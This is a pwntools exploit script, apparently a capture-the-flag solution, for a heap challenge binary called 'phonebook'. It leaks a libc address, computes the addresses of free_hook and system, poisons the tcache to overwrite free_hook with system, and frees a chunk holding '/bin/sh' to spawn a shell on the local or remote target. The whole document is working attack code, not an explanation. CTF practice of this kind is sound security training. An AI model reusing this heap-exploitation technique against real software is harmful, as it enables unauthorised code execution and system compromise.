from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

binary = './chall/phonebook'
nc = 'nc 0.0.0.0 1337'
elf = context.binary = ELF(binary, checksec=False)
gdbscript = """
            b * edit_name + 140
            c
            """

if len(sys.argv) == 1: p = process(binary)
elif sys.argv[1] == 'd': p = gdb.debug(binary, gdbscript)
elif sys.argv[1] == 'r': p = remote(nc.split(' ')[1], int(nc.split(' ')[2]))
else: p = process(binary); print('[-] weird option: ' + sys.argv[1])

# Leak libc


# malloc person1
# malloc name1(0x30, any)
p.sendline(b'1\n0\n32\n' + 30 * b'B' + b'\n555\n1')

# malloc person2
# malloc name2(0x420, any)
p.sendline(b'1\n1\n1056\n' + 10 * b'A' + b'\n666\n1')

# edit name1(0x20, any)
p.sendline(b'2\n0\n1\n20\nCCCCCCC')

# unfriend person2
p.sendline(b'4\n1\n')

# pofuk person1
p.sendline(b'2\n0\n2\n66666666')
# call person1 / jump to main
p.sendline(b'3\n0\n')

# edit relation2(friendly)
p.sendline(b'2\n1\n3\n1')
# call person2
p.sendline(b'3\n1')

p.recvuntil(b'Hey ')
leak = p.recv(6)
real_leak = ''
for i in reversed(leak):
        real_leak += str(hex(i))[2:]
real_leak = int(real_leak, 16)
offset = 0x1ecbe0

libc_base = real_leak - offset
free_hook = libc_base + 0x001eee48
libc_system = libc_base + 0x000522c0
print(f'libc base: {hex(libc_base)}')
print(f'free hook: {hex(free_hook)}')
print(f'libc system: {hex(libc_system)}')


# Tcache poison part

# edit person2 phone(free_hook)
p.sendline(b'2\n1\n2')
p.sendline(p64(free_hook-0x10))

# edit name1(0x30, /bin/sh\0)
p.sendline(b'2\n0\n1\n33\n/bin/sh\0')

# add hidden note
p.sendline(b'5\n' + 0x10 * b'A' + p64(libc_system))

p.sendline(b'4\n0')

p.interactive()
p.close()
